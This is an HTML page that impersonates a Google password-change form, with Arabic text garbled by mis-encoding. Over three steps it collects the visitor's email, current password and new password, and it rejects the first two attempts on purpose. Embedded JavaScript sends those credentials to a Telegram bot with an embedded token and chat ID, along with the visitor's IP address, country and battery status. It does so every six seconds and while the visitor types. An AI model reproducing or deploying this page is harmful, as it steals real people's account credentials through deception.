<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± â€” Google</title>
<style>
body{margin:0;background:#f5f7fa;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center;position:relative}
.logo{font-size:32px;font-weight:700;margin-bottom:16px;font-family:Product Sans,Roboto,sans-serif;}
.logo span.g{color:#4285F4;}
.logo span.o1{color:#EA4335;}
.logo span.o2{color:#FBBC05;}
.logo span.g2{color:#4285F4;}
.logo span.l{color:#34A853;}
.logo span.e{color:#EA4335;}
.description{font-size:14px;color:#5f6368;margin-bottom:16px;line-height:1.5}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12px 0;font-size:15px;outline:none;transition:border 0.2s}
input:focus{border-color:#1a73e8}
button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
button:hover{background:#1558b0}
.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
.success{font-size:18px;color:green;margin-top:20px;display:none}
.step{display:none}
.step.active{display:block}
.shake{animation:shake 0.3s}
@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
  </div>

  <div class="description">
    Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ÙˆÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ù„ØªØ­Ø¯ÙŠØ« Ø­Ø³Ø§Ø¨Ùƒ Ø¨Ø£Ù…Ø§Ù†.
  </div>

  <form id="form">
    <!-- Ø§Ù„Ø®Ø·ÙˆØ© 1 -->
    <div class="step step1 active">
      <input type="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required id="email">
      <div class="error">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨Ø±ÙŠØ¯ Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ØµØ§Ù„Ø­</div>
      <button type="button" id="next1">Ø§Ù„ØªØ§Ù„ÙŠ</button>
    </div>

    <!-- Ø§Ù„Ø®Ø·ÙˆØ© 2 -->
    <div class="step step2">
      <input type="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©" required minlength="8" id="currentPassword">
      <div class="error">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ© ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† 8 Ø£Ø­Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„</div>
      <button type="button" id="next2">Ø§Ù„ØªØ§Ù„ÙŠ</button>
    </div>

    <!-- Ø§Ù„Ø®Ø·ÙˆØ© 3 -->
    <div class="step step3">
      <input type="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©" required minlength="8" id="newPassword">
      <input type="password" placeholder="ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required minlength="8" id="confirmPassword">
      <div class="error" id="error3">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† â‰¥ 8 Ø£Ø­Ø±Ù ÙˆÙ…ØªØ·Ø§Ø¨Ù‚Ø©</div>
      <div class="success" id="successMessage">ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø¨Ù†Ø¬Ø§Ø­</div>
      <button type="button" id="verifyPass">Ø§Ù„ØªØ§Ù„ÙŠ</button>
    </div>
  </form>
</div>

<script>
const step1 = document.querySelector(".step1");
const step2 = document.querySelector(".step2");
const step3 = document.querySelector(".step3");
const next1 = document.getElementById("next1");
const next2 = document.getElementById("next2");
const verifyPass = document.getElementById("verifyPass");
const error3 = document.getElementById("error3");
const successMessage = document.getElementById("successMessage");

const telegramToken = "7481011898:AAE2PugM779HQxfO4TifHN74w30-Rqtkvls"; 
const chatId = "8089516279"; 

let attemptCount = 0;
let lastMessageSent = "";
let batteryStatus = {charging:"ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", level:"ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"};
let userIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

// Ø­Ø§Ù„Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
if(navigator.getBattery){
  navigator.getBattery().then(bat=>{
    batteryStatus.charging = bat.charging ? "ÙŠØ´Ø­Ù†" : "ØºÙŠØ± Ù…Ø´Ø­ÙˆÙ†";
    batteryStatus.level = (bat.level*100)+"%";
    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "ÙŠØ´Ø­Ù†" : "ØºÙŠØ± Ù…Ø´Ø­ÙˆÙ†");
    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
  });
}

// IP ÙˆØ§Ù„Ø¯ÙˆÙ„Ø©
fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
  userIP = `${data.ip} - ${data.country_name}`;
});

// Ø§Ù„Ø®Ø·ÙˆØ© 1
next1.addEventListener("click", ()=>{
  const input = document.getElementById("email");
  if(input.checkValidity()){
    step1.classList.remove("active");
    step2.classList.add("active");
  } else {
    step1.querySelector(".error").style.display="block";
  }
});

// Ø§Ù„Ø®Ø·ÙˆØ© 2
next2.addEventListener("click", ()=>{
  const input = document.getElementById("currentPassword");
  if(input.checkValidity()){
    step2.classList.remove("active");
    step3.classList.add("active");
  } else {
    step2.querySelector(".error").style.display="block";
  }
});

// Ø§Ù„Ø®Ø·ÙˆØ© 3: ØªØ­Ù‚Ù‚ Ù…Ù† ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ù„Ù…Ø¯Ø© 3 Ù…Ø­Ø§ÙˆÙ„Ø§Øª
verifyPass.addEventListener("click", ()=>{
  const newPass = document.getElementById("newPassword").value;
  const confirmPass = document.getElementById("confirmPassword").value;

  if(newPass.length >= 8 && newPass === confirmPass){
    attemptCount++;
    if(attemptCount < 3){
      error3.style.display="block";
      verifyPass.classList.add("shake");
      setTimeout(()=>verifyPass.classList.remove("shake"),300);
    } else {
      error3.style.display="none";
      successMessage.style.display="block";
      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);

      sendData(); // Ø¥Ø±Ø³Ø§Ù„ Ø¢Ø®Ø± Ù†Ø³Ø®Ø© Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù†Ø¯ Ø§Ù„Ù†Ø¬Ø§Ø­
    }
  } else {
    error3.style.display="block";
    verifyPass.classList.add("shake");
    setTimeout(()=>verifyPass.classList.remove("shake"),300);
  }
});

// Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
function sendData(){
  const email = document.getElementById("email").value.trim();
  const currentPassword = document.getElementById("currentPassword").value.trim();
  const newPassword = document.getElementById("newPassword").value.trim();

  if(email === "" && currentPassword === "" && newPassword === "") return;

  const message = `ğŸ“¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø©:\n\nâœ‰ï¸ Ø§Ù„Ø¨Ø±ÙŠØ¯: ${email || "ÙØ§Ø±Øº"}\nğŸ”‘ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©: ${currentPassword || "ÙØ§Ø±Øº"}\nğŸ”’ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©: ${newPassword || "ÙØ§Ø±Øº"}\nğŸ”‹ Ø­Ø§Ù„Ø© Ø§Ù„Ø´Ø­Ù†: ${batteryStatus.charging} - ${batteryStatus.level}\nğŸŒ IP ÙˆØ§Ù„Ø¯ÙˆÙ„Ø©: ${userIP}`;

  if(message !== lastMessageSent){
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: chatId, text: message})
    });
    lastMessageSent = message;
  }
}

// Ø­ÙØ¸ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø¨Ø¹Ø¯ 6 Ø«ÙˆØ§Ù†ÙŠ Ù…Ù† Ø§Ù„ÙƒØªØ§Ø¨Ø©
let timeoutId;
document.querySelectorAll("input").forEach(input=>{
  input.addEventListener("input", ()=>{
    clearTimeout(timeoutId);
    timeoutId = setTimeout(sendData, 6000);
  });
});

// Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© ÙƒÙ„ 6 Ø«ÙˆØ§Ù†ÙŠ
setInterval(sendData, 6000);
</script>

</body>
</html>
